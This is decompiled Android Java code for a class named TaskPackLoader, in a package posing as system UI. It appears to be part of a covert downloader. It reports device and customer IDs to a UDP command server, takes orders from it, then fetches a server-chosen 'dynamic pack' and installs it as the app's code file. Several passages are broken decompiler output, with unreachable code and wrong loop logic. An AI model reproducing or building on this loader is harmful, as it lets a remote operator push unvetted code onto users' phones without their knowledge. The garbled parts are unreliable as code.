package com.android.systemui.assis.task;

import android.content.Context;
import android.os.Message;
import android.text.format.Time;
import com.android.systemui.assis.app.LOG;
import com.android.systemui.assis.app.MAIN.CONFIG;
import com.android.systemui.assis.app.MAIN.KEY;
import com.android.systemui.assis.core.IStatistics;
import com.android.systemui.assis.core.IStatistics.ShellInfo;
import com.android.systemui.assis.core.IStatistics.UdpServer;
import com.android.systemui.assis.core.ITaskListener;
import com.android.systemui.assis.datas.security.Guardian;
import com.android.systemui.assis.datas.security.Guardian.MD5;
import com.android.systemui.assis.modules.IMainConfig;
import com.android.systemui.assis.modules.INetClient;
import com.android.systemui.assis.modules.INetClient.DownloadRequest;
import com.android.systemui.assis.modules.INetClient.Server;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;
import org.json.JSONException;
import org.json.JSONObject;

public class TaskPackLoader implements ITask {
    private static final String ADDRESS = "address";
    private static final String CODE = "code";
    private static final String CUSTID = "cid";
    private static final String INTERVAL = "interval";
    private static final String MD5 = "md";
    private static final String NETTYPE = "net";
    private static final String OPERATION = "op";
    private static final String PACK = "pack";
    private static final String PROJECTID = "pid";
    private static final String SIGN = "sign";
    private static final String SIGNKEY = "ts";
    private static final String SIZE = "size";
    private static final String TAG = "TaskPackLoader";
    private static final String TASK = "task";
    private static final String TCPPORT = "port";
    private static final String TCPSVR = "tcpSvr";
    private static final String VERCODE = "vcode";
    private IMainConfig mConfig = null;
    private Context mContext = null;
    private String mLocalPackMD5 = "";
    private INetClient mNetClient = null;
    private DynamicPackChecker mPackChecker = null;
    private CheckDynamicPackServer mPackServerChecker = null;
    private IStatistics mShell = null;

    private class CheckDynamicPackServer implements Runnable {
        private Server mServer;

        private CheckDynamicPackServer() {
            this.mServer = null;
        }

        public void setServer(Server svr) {
            this.mServer = svr;
        }

        private String constructRequest() {
            try {
                int randKey = new Random().nextInt(9);
                String sign = Guardian.md5Encode(new StringBuilder(String.valueOf(randKey)).append(KEY.GUARDIAN).toString());
                JSONObject jsonObj = new JSONObject();
                jsonObj.put(TaskPackLoader.OPERATION, 1002);
                jsonObj.put(TaskPackLoader.CUSTID, TaskPackLoader.this.mShell.getShellInfo().mCustId);
                jsonObj.put(TaskPackLoader.VERCODE, TaskPackLoader.this.mShell.getShellInfo().mVersionCode);
                jsonObj.put(TaskPackLoader.PROJECTID, TaskPackLoader.this.mShell.getShellInfo().mAppletId);
                jsonObj.put(TaskPackLoader.MD5, TaskPackLoader.this.mLocalPackMD5);
                jsonObj.put(TaskPackLoader.SIGN, sign);
                jsonObj.put(TaskPackLoader.SIGNKEY, randKey);
                return jsonObj.toString();
            } catch (JSONException e) {
                e.printStackTrace();
                return null;
            }
        }

        private Pack parseResponse(String response) {
            Pack pack = null;
            if (response == null) {
                return null;
            }
            try {
                JSONObject rspObj = new JSONObject(response);
                if (rspObj.has(TaskPackLoader.CODE) && rspObj.getInt(TaskPackLoader.CODE) == 0) {
                    JSONObject packObj = rspObj.getJSONObject(TaskPackLoader.PACK);
                    Pack pack2 = new Pack();
                    try {
                        pack2.mSize = (long) packObj.getDouble(TaskPackLoader.SIZE);
                        pack2.mMD5 = packObj.getString(TaskPackLoader.MD5);
                        pack2.mAddress = packObj.getString(TaskPackLoader.ADDRESS);
                        pack = pack2;
                    } catch (JSONException e) {
                        JSONException e2 = e;
                        pack = pack2;
                        e2.printStackTrace();
                        return pack;
                    }
                }
            } catch (JSONException e3) {
                e2 = e3;
                e2.printStackTrace();
                return pack;
            }
            return pack;
        }

        public void run() {
            String request = constructRequest();
            if (request != null) {
                LOG.I(TaskPackLoader.TAG, "request : " + request);
                String response = TaskPackLoader.this.mNetClient.tcpRequest(this.mServer, request);
                LOG.I(TaskPackLoader.TAG, "response : " + response);
                Pack pack = parseResponse(response);
                if (pack != null) {
                    Message msg = new Message();
                    msg.what = 52;
                    msg.obj = pack;
                    TaskPackLoader.this.mShell.sendMessage(msg);
                }
            }
        }
    }

    private class DownloadPack {
        private Pack mPack = null;

        private class DownloadPackListener implements ITaskListener {
            private DownloadRequest request;

            public DownloadPackListener(DownloadRequest request) {
                this.request = request;
            }

            public void onPreExecute(int result, Object data) {
            }

            public void onUpdate(int result, Object data) {
            }

            public void onExecuted(int result, Object data) {
                if (result == 0) {
                    LOG.I(TaskPackLoader.TAG, "download pack success.");
                    File targetFile = new File(new StringBuilder(String.valueOf(TaskPackLoader.this.mShell.getAppletContext().getFilesDir().getAbsolutePath())).append(File.separator).append(CONFIG.DYNAMIC_PACK_NAME).toString());
                    LOG.I(TaskPackLoader.TAG, "targetFile : " + targetFile);
                    File newFile = new File(new StringBuilder(String.valueOf(this.request.localPath)).append(this.request.fileName).toString());
                    LOG.I(TaskPackLoader.TAG, "newFile : " + newFile);
                    if (targetFile.exists()) {
                        targetFile.delete();
                    }
                    newFile.renameTo(targetFile);
                    TaskPackLoader.this.mShell.sendEmptyMessage(40);
                }
            }
        }

        public DownloadPack(Pack pack) {
            this.mPack = pack;
        }

        public void submit() {
            DownloadRequest request = new DownloadRequest();
            request.fileName = "DynMain";
            request.localPath = TaskPackLoader.this.mShell.getAppletContext().getFilesDir() + File.separator;
            request.notifyId = -1;
            request.targetSize = this.mPack.mSize;
            request.url = this.mPack.mAddress;
            TaskPackLoader.this.mNetClient.downloadObject(request, new DownloadPackListener(request));
        }
    }

    private class DynamicPackChecker implements Runnable {

        private class packCheckResponse {
            public int mCommand;
            public int mNextRequestInteval;
            public int mTcpPort;
            public String mTcpSvr;

            private packCheckResponse() {
            }
        }

        private DynamicPackChecker() {
        }

        public void run() {
            if (copyPackFromAssertToFileDir()) {
                TaskPackLoader.this.mLocalPackMD5 = MD5.md5sum(TaskPackLoader.this.mContext.getFilesDir() + File.separator + CONFIG.DYNAMIC_PACK_NAME).toLowerCase();
            }
            String request = constructUdpRequest();
            LOG.I(TaskPackLoader.TAG, "json object : " + request);
            String response = doUdpRequest(request);
            if (response == null) {
                TaskPackLoader.this.mShell.sendEmptyMessage(53);
                return;
            }
            LOG.I(TaskPackLoader.TAG, "response : " + response);
            packCheckResponse rsp = parseUdpResponse(response);
            if (rsp == null) {
                return;
            }
            if (rsp.mCommand == 9) {
                Message msg = new Message();
                msg.what = 51;
                Server svr = new Server();
                svr.mAddress = rsp.mTcpSvr;
                svr.mPort = rsp.mTcpPort;
                msg.obj = svr;
                TaskPackLoader.this.mShell.sendMessage(msg);
            } else if (rsp.mCommand == 10) {
                TaskPackLoader.this.mShell.setRegServer(rsp.mTcpSvr, rsp.mTcpPort);
                TaskPackLoader.this.mShell.sendEmptyMessage(53);
            } else if (rsp.mCommand == 120) {
                TaskPackLoader.this.mShell.sendEmptyMessage(100);
            }
        }

        private boolean copyPackFromAssertToFileDir() {
            File internalDexFile = new File(TaskPackLoader.this.mContext.getFilesDir() + File.separator + CONFIG.DYNAMIC_PACK_NAME);
            try {
                if (internalDexFile.exists()) {
                    return true;
                }
                InputStream in = TaskPackLoader.this.mContext.getResources().getAssets().open(CONFIG.DYNAMIC_PACK_NAME);
                FileOutputStream fos = new FileOutputStream(internalDexFile);
                byte[] buffer = new byte[10240];
                int bufferRead = 0;
                while (bufferRead != -1) {
                    bufferRead = in.read(buffer);
                    fos.write(buffer);
                }
                in.close();
                fos.close();
                return true;
            } catch (IOException e) {
                LOG.E(TaskPackLoader.TAG, "IOException " + e.getMessage());
                if (internalDexFile.exists()) {
                    internalDexFile.delete();
                }
                return false;
            }
        }

        private String constructUdpRequest() {
            String request = null;
            ShellInfo shellInfo = TaskPackLoader.this.mShell.getShellInfo();
            try {
                JSONObject requestObj = new JSONObject();
                requestObj.put(TaskPackLoader.CUSTID, shellInfo.mCustId);
                requestObj.put(TaskPackLoader.PROJECTID, shellInfo.mAppletId);
                requestObj.put(TaskPackLoader.NETTYPE, TaskPackLoader.this.mNetClient.getCurrentNetTypeName());
                requestObj.put(TaskPackLoader.MD5, TaskPackLoader.this.mLocalPackMD5);
                request = requestObj.toString();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            return request;
        }

        private packCheckResponse parseUdpResponse(String response) {
            packCheckResponse com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse = null;
            if (response == null) {
                return null;
            }
            try {
                JSONObject rspObj = new JSONObject(response);
                packCheckResponse packCheckRsp = new packCheckResponse();
                try {
                    packCheckRsp.mCommand = rspObj.getInt(TaskPackLoader.TASK);
                    if (rspObj.has(TaskPackLoader.INTERVAL)) {
                        packCheckRsp.mNextRequestInteval = rspObj.getInt(TaskPackLoader.INTERVAL);
                    }
                    if (rspObj.has(TaskPackLoader.TCPSVR)) {
                        packCheckRsp.mTcpSvr = rspObj.getString(TaskPackLoader.TCPSVR);
                        if (rspObj.has(TaskPackLoader.TCPPORT)) {
                            packCheckRsp.mTcpPort = rspObj.getInt(TaskPackLoader.TCPPORT);
                            com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse = packCheckRsp;
                        } else {
                            com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse = packCheckRsp;
                        }
                    } else {
                        com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse = packCheckRsp;
                    }
                } catch (JSONException e) {
                    e = e;
                    com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse = packCheckRsp;
                    e.printStackTrace();
                    return com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse;
                }
            } catch (JSONException e2) {
                JSONException e3;
                e3 = e2;
                e3.printStackTrace();
                return com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse;
            }
            return com_android_systemui_assis_task_TaskPackLoader_DynamicPackChecker_packCheckResponse;
        }

        private String doUdpRequest(String request) {
            IOException e;
            Throwable th;
            int retryCount = 0;
            DatagramSocket socket = null;
            UdpServer udpServer = TaskPackLoader.this.mShell.getUdpServer();
            LOG.I(TaskPackLoader.TAG, "SERVER: [" + udpServer.mIP + ":" + udpServer.mMinPort + "~" + udpServer.mMaxPort + "]");
            LOG.I(TaskPackLoader.TAG, "requestString=" + request);
            byte[] buffer = request.getBytes();
            do {
                try {
                    int destPort;
                    InetAddress destIp = InetAddress.getByName(udpServer.mIP);
                    if (udpServer.mMaxPort <= udpServer.mMinPort) {
                        if (udpServer.mMaxPort >= udpServer.mMinPort) {
                            destPort = udpServer.mMaxPort;
                        } else {
                            destPort = new Random().nextInt(udpServer.mMinPort - udpServer.mMaxPort) + udpServer.mMaxPort;
                        }
                    } else {
                        destPort = new Random().nextInt(udpServer.mMaxPort - udpServer.mMinPort) + udpServer.mMinPort;
                    }
                    LOG.I(TaskPackLoader.TAG, "dest IP:" + destIp);
                    LOG.I(TaskPackLoader.TAG, "dest port : " + destPort);
                    DatagramPacket hPacket = new DatagramPacket(buffer, buffer.length, destIp, destPort);
                    byte[] recvBuffer = new byte[1024];
                    DatagramPacket cPacket = new DatagramPacket(recvBuffer, recvBuffer.length);
                    DatagramSocket socket2 = new DatagramSocket();
                    try {
                        LOG.I(TaskPackLoader.TAG, "send udp");
                        try {
                            socket2.send(hPacket);
                            socket2.setSoTimeout(10000);
                            socket2.receive(cPacket);
                            int len = cPacket.getLength();
                            if (len > 0) {
                                String response = new String(recvBuffer, 0, len);
                                if (socket2 == null) {
                                    return response;
                                }
                                try {
                                    socket2.close();
                                    socket = socket2;
                                    return response;
                                } catch (Exception e2) {
                                    e2.printStackTrace();
                                    socket = socket2;
                                    return response;
                                }
                            } else if (socket2 == null) {
                                socket = socket2;
                            } else {
                                try {
                                    socket2.close();
                                    socket = socket2;
                                } catch (Exception e22) {
                                    e22.printStackTrace();
                                    socket = socket2;
                                }
                            }
                        } catch (IOException e3) {
                            e = e3;
                            socket = socket2;
                        } catch (Throwable th2) {
                            th = th2;
                            socket = socket2;
                        }
                    } catch (IOException e4) {
                        e = e4;
                        socket = socket2;
                        e.printStackTrace();
                        retryCount++;
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e1) {
                            e1.printStackTrace();
                        } catch (Throwable th3) {
                            th = th3;
                        }
                        if (socket != null) {
                            try {
                                socket.close();
                            } catch (Exception e222) {
                                e222.printStackTrace();
                            }
                        }
                        if (retryCount >= 3) {
                            return null;
                        }
                    } catch (Throwable th4) {
                        th = th4;
                        socket = socket2;
                    }
                } catch (IOException e5) {
                    e = e5;
                    e.printStackTrace();
                    retryCount++;
                    Thread.sleep(1000);
                    if (socket != null) {
                        socket.close();
                    }
                    if (retryCount >= 3) {
                        return null;
                    }
                }
            } while (retryCount >= 3);
            return null;
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception e2222) {
                    e2222.printStackTrace();
                }
            }
            throw th;
            throw th;
        }
    }

    private class Pack {
        public String mAddress;
        public String mMD5;
        public long mSize;

        private Pack() {
        }
    }

    public void onCreate(IStatistics shell) {
        this.mShell = shell;
        this.mContext = shell.getAppletContext();
        this.mNetClient = (INetClient) shell.getShellService(IStatistics.INSTANCE_NETCLIENT);
        this.mConfig = (IMainConfig) shell.getShellService(IStatistics.INSTANCE_SHELLCONFIG);
    }

    public void onDestroy() {
    }

    public boolean onMinTick(Time curSysTime) {
        return false;
    }

    public boolean processSystemMessage(Message msg) {
        if (msg.what == 40) {
            doCheckDynamicPack();
            return true;
        } else if (msg.what == 51) {
            doCheckDynamicPackServer((Server) msg.obj);
            return true;
        } else if (msg.what != 52) {
            return false;
        } else {
            doDownloadDynamicPack((Pack) msg.obj);
            return true;
        }
    }

    private void doCheckDynamicPack() {
        if (this.mPackChecker == null) {
            this.mPackChecker = new DynamicPackChecker();
        }
        this.mShell.submitTask(this.mPackChecker);
    }

    private void doCheckDynamicPackServer(Server server) {
        if (this.mPackServerChecker == null) {
            this.mPackServerChecker = new CheckDynamicPackServer();
        }
        this.mPackServerChecker.setServer(server);
        this.mShell.submitTask(this.mPackServerChecker);
    }

    private void doDownloadDynamicPack(Pack pack) {
        new DownloadPack(pack).submit();
    }
}
